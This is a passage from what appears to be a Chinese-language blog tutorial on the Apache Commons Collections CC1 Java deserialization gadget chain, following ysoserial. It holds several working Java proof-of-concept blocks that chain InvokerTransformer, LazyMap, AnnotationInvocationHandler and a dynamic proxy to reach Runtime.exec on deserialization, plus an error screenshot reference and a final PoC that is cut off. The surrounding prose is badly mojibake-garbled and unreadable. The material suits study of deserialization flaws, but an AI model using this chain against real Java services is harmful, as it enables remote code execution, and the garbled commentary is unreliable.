</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">               
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúÄÂü∫Êú¨ÁöÑÈìæÂ≠êÂ§ßÊ¶ÇÂ¶Ç‰∏äÔºåÁé∞Âú®Â∞±ÊòØÊÄùËÄÉÂ¶Ç‰ΩïË∑≥Âà∞LazyMapÁöÑgetÊñπÊ≥ïÔºåÁªìÂêàÂâçÈù¢ÁöÑËØ¥Ê≥ïÔºåÁé∞Âú®Â∞±ÊòØË¶ÅÊÄùËÄÉÂ¶Ç‰ΩïËÆæÁΩÆ‰ª£ÁêÜÂØπË±°ÔºåÁªìÂêàÂä®ÊÄÅ‰ª£ÁêÜÁöÑÊµÅÁ®ãÔºåÂú®ËøôÈáåÊàë‰ª¨Â∞ÜMapÊé•Âè£Á±ª‰Ωú‰∏∫‚Äú‰∏≠Èó¥‚ÄùÁ±ªÔºåÂàöÂ•Ω‚ÄúÂßîÊâòÁ±ª‚ÄùLazyMapÊòØÂÆûÁé∞‰∫ÜMapÊé•Âè£ÁöÑÔºåÊâÄ‰ª•ÊòØÂæàÂêàÈÄÇÁöÑ„ÄÇ</p>
<p>ÁÑ∂ÂêéÁêÜËß£‰∏Ä‰∏ãysoserialÈìæÔºåÂèØ‰ª•Áü•ÊôìÂú®ÈÅçÂéÜMap(proxy)Êó∂‰ºöË∞ÉÁî®memberValues.entrySetÊñπÊ≥ïÔºåËøõËÄåÂèØ‰ª•Ëß¶ÂèëinvokeÊñπÊ≥ï„ÄÇ</p>
<p>‰∏ÄÊ≠•‰∏ÄÊ≠•Êù•ÔºåÊâÄ‰ª•È¶ñÂÖàÊàë‰ª¨ËøôÈáåÊûÑÈÄ†handlerÔºå</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéË∞ÉÁî®ProxyÁöÑnewProxyInstance()ÊñπÊ≥ïÔºåÁî®Êù•ÂàõÂª∫‰∏Ä‰∏™‰ª£ÁêÜÂØπË±°ÔºåÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//ysoerialÈìæËøôÈáåÂÖ∂ÂÆûÂà©Áî®ÁöÑÊòØMap.classÁöÑÊûÑÈÄ†Âô®Á≠âÔºå‰ΩÜÊòØÂÖ∂ÂÆûÂú®ÊúÄÂêéÁöÑÂà©Áî®‰∏≠Â∑ÆÂà´‰∏çÂ§ßÔºåÂÖàË∑üËøô‰∏™</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">interfaces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getInterfaces</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="w"> </span><span class="n">proxyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="n">interfaces</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÊ†∑Â∞±ÊàêÂäüÂàõÂª∫‰∫Ü‰∏Ä‰∏™‰ª£ÁêÜÂØπË±°ÔºåËøôÊòØÂÜçÁúãysoserialÔºåÁ≤æÂ¶ôÁöÑÂú∞ÊñπÊù•‰∫ÜÔºåÂ¶Ç‰∏ã‰ª£Á†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="ne">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">constructor1</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="o">.</span><span class="k">class</span><span class="p">,</span><span class="n">proxyMap</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂÜçÂ∞ÜËøô‰∏™oÂ∫èÂàóÂåñÂπ∂ÂèçÂ∫èÂàóÂåñÔºåÂΩìÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÔºå‰ºöÂØπproxyMapË∞ÉÁî®entryMap()ÊñπÊ≥ïÔºåÊ≠§Êó∂Â∞±‰ºöÂà∞AnnotationInvocationHandlerÁöÑinvokeÊñπÊ≥ïÔºåÁÑ∂Âêé‰∏ÄÂàáÈÉΩ‰ºöÂæÄÈ¢ÑÊúüÁöÑÊñπÂêëÂèëÂ±ï„ÄÇÂÜçÂ∞ÜÂâçÈù¢ÊâÄÊúâÁöÑ‰ª£Á†ÅÁªìÂêàËµ∑Êù•Á®çÂæÆÊîπÊîπÔºåÂ∞±ÊòØÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">interfaces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getInterfaces</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">proxyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="n">interfaces</span><span class="p">,</span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">proxyMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Â∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ÂèçÂ∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ctf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctf</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctf</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Êä•Èîô</p>
<p><img src="/p/cc1/image-20240727002214764.png"
	width="1436"
	height="130"
	srcset="/p/cc1/image-20240727002214764_hu18086111980640610215.png 480w, /p/cc1/image-20240727002214764_hu10649971985040228503.png 1024w"
	loading="lazy"
	
		alt="image-20240727002214764"
	
	
		class="gallery-image" 
		data-flex-grow="1104"
		data-flex-basis="2651px"
	
></p>
<p>ËøôÊòØÂõ†‰∏∫Âú®ËÆæÁΩÆ‰ª£ÁêÜÂØπË±°Êó∂ÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞<code>Map.class.getInterfaces()</code>ÁöÑMap.classÂπ∂Ê≤°ÊúâÂÆûÁé∞MapÊé•Âè£ÔºåÂä®ÊÄÅ‰ª£ÁêÜÊ≤°ÊéåÊè°Â•ΩÔºåÁÖßÁå´ÁîªËôé‰∫ÜÂ±û‰∫éÊòØÔºåÊâÄ‰ª•ËøôÈáåÂÆåÂÖ®ÊòØÂ§öÊ≠§‰∏Ä‰∏æ‰∫ÜÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®Map.classÂç≥ÂèØÔºåËÄå‰∏îÊú¨Ë∫´MapÂ∞±ÊòØ‰∏Ä‰∏™Êé•Âè£Á±ª„ÄÇ</p>
<p>ÊâÄ‰ª•ÊúÄÁªàÁöÑPOC‰∏∫Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
